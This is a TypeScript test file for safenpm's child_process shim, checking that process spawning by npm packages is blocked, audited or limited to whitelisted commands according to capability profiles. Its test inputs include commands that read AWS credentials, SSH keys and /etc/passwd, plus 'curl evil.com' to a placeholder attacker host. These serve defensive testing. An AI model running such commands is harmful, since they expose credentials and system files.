/**
 * child-process-shim.test.ts
 *
 * Tests for src/enforcer/shims/child-process.shim.ts
 *
 * child_process is blocked by default. Packages that legitimately need
 * it (e.g., webpack, node-gyp) must have it declared in their profile.
 * Even when allowed, every spawn is logged for audit.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import { createChildProcessShim } from '../../src/enforcer/shims/child-process.shim'
import type { PackageCapability, Violation } from '../../src/capabilities/schema'

const noSpawnProfile: PackageCapability = {
  version: '1.0.0',
  fs: { read: [], write: [] },
  net: { outbound: false, hosts: [] },
  env: [],
  child_process: { allowed: false },
  worker_threads: false,
  hasNativeModules: false,
  approvedBy: 'user',
  approvedAt: '2026-01-01T00:00:00Z',
}

const spawnAllowedProfile: PackageCapability = {
  ...noSpawnProfile,
  child_process: { allowed: true },
}

const limitedSpawnProfile: PackageCapability = {
  ...noSpawnProfile,
  child_process: { allowed: true, allowedCommands: ['node', 'python3'] },
}

function makeMockCp(): Record<string, ReturnType<typeof vi.fn>> {
  return {
    exec: vi.fn((cmd, callback) => { callback?.(null, 'ok', ''); return { pid: 1 } }),
    execSync: vi.fn().mockReturnValue(Buffer.from('ok')),
    spawn: vi.fn().mockReturnValue({ on: vi.fn(), stdout: { on: vi.fn() }, stderr: { on: vi.fn() } }),
    spawnSync: vi.fn().mockReturnValue({ status: 0, stdout: Buffer.from('') }),
    execFile: vi.fn(),
    execFileSync: vi.fn().mockReturnValue(Buffer.from('')),
    fork: vi.fn().mockReturnValue({ on: vi.fn(), send: vi.fn() }),
  }
}

describe('child_process shim — ALL methods blocked when allowed: false', () => {
  let violations: Violation[]
  let mockCp: ReturnType<typeof makeMockCp>
  let shim: ReturnType<typeof makeMockCp>

  beforeEach(() => {
    violations = []
    mockCp = makeMockCp()
    shim = createChildProcessShim(mockCp, noSpawnProfile, 'evil-pkg', v => violations.push(v)) as typeof mockCp
  })

  it('exec() throws and is not called', () => {
    expect(() => shim.exec('cat ~/.aws/credentials')).toThrow('[safenpm] BLOCKED')
    expect(mockCp.exec).not.toHaveBeenCalled()
  })

  it('execSync() throws and is not called', () => {
    expect(() => shim.execSync('cat ~/.aws/credentials')).toThrow('[safenpm] BLOCKED')
    expect(mockCp.execSync).not.toHaveBeenCalled()
  })

  it('spawn() throws and is not called', () => {
    expect(() => shim.spawn('sh', ['-c', 'cat ~/.ssh/id_rsa'])).toThrow('[safenpm] BLOCKED')
    expect(mockCp.spawn).not.toHaveBeenCalled()
  })

  it('spawnSync() throws and is not called', () => {
    expect(() => shim.spawnSync('sh', ['-c', 'env'])).toThrow('[safenpm] BLOCKED')
    expect(mockCp.spawnSync).not.toHaveBeenCalled()
  })

  it('execFile() throws and is not called', () => {
    expect(() => shim.execFile('/bin/bash', ['-c', 'id'])).toThrow('[safenpm] BLOCKED')
    expect(mockCp.execFile).not.toHaveBeenCalled()
  })

  it('fork() throws and is not called', () => {
    expect(() => shim.fork('/tmp/worker.js')).toThrow('[safenpm] BLOCKED')
    expect(mockCp.fork).not.toHaveBeenCalled()
  })

  it('violation has HIGH severity and correct reason', () => {
    try { shim.exec('whoami') } catch { /* expected */ }
    expect(violations[0].severity).toBe('HIGH')
    expect(violations[0].reason).toBe('UNAUTHORIZED_PROCESS_SPAWN')
    expect(violations[0].blocked).toBe(true)
    expect(violations[0].package).toBe('evil-pkg')
    expect(violations[0].attempted).toContain('exec')
    expect(violations[0].attempted).toContain('whoami')
  })
})

describe('child_process shim — ALLOWED with no command restrictions', () => {
  let violations: Violation[]
  let mockCp: ReturnType<typeof makeMockCp>
  let shim: ReturnType<typeof makeMockCp>

  beforeEach(() => {
    violations = []
    mockCp = makeMockCp()
    shim = createChildProcessShim(mockCp, spawnAllowedProfile, 'webpack', v => violations.push(v)) as typeof mockCp
  })

  it('exec() passes through and calls real function', () => {
    shim.exec('node --version')
    expect(mockCp.exec).toHaveBeenCalledWith('node --version')
  })

  it('spawn() passes through', () => {
    shim.spawn('node', ['script.js'])
    expect(mockCp.spawn).toHaveBeenCalled()
  })

  it('logs a LOW audit violation when allowed', () => {
    shim.exec('node --version')
    expect(violations).toHaveLength(1)
    expect(violations[0].severity).toBe('LOW')
    expect(violations[0].reason).toBe('PROCESS_SPAWN_AUDIT')
    expect(violations[0].blocked).toBe(false)
  })
})

describe('child_process shim — ALLOWED with allowedCommands restriction', () => {
  let violations: Violation[]
  let mockCp: ReturnType<typeof makeMockCp>
  let shim: ReturnType<typeof makeMockCp>

  beforeEach(() => {
    violations = []
    mockCp = makeMockCp()
    shim = createChildProcessShim(mockCp, limitedSpawnProfile, 'build-tool', v => violations.push(v)) as typeof mockCp
  })

  it('allows exec of whitelisted command (node)', () => {
    shim.exec('node --version')
    expect(mockCp.exec).toHaveBeenCalled()
  })

  it('allows spawn of whitelisted command (python3)', () => {
    shim.spawn('python3', ['script.py'])
    expect(mockCp.spawn).toHaveBeenCalled()
  })

  it('blocks exec of non-whitelisted command (sh)', () => {
    expect(() => shim.exec('sh -c "curl evil.com"')).toThrow('[safenpm] BLOCKED')
    expect(mockCp.exec).not.toHaveBeenCalled()
    expect(violations[0].reason).toBe('UNAUTHORIZED_PROCESS_SPAWN')
  })

  it('blocks spawn of non-whitelisted command (bash)', () => {
    expect(() => shim.spawn('bash', ['-c', 'cat /etc/passwd'])).toThrow('[safenpm] BLOCKED')
  })
})

describe('child_process shim — null profile', () => {
  it('blocks all spawning for unregistered package', () => {
    const violations: Violation[] = []
    const shim = createChildProcessShim(makeMockCp(), null, 'unknown', v => violations.push(v))
    expect(() => (shim as ReturnType<typeof makeMockCp>).exec('ls')).toThrow('[safenpm] BLOCKED')
    expect(violations[0].reason).toBe('NO_CAPABILITY_PROFILE')
  })
})
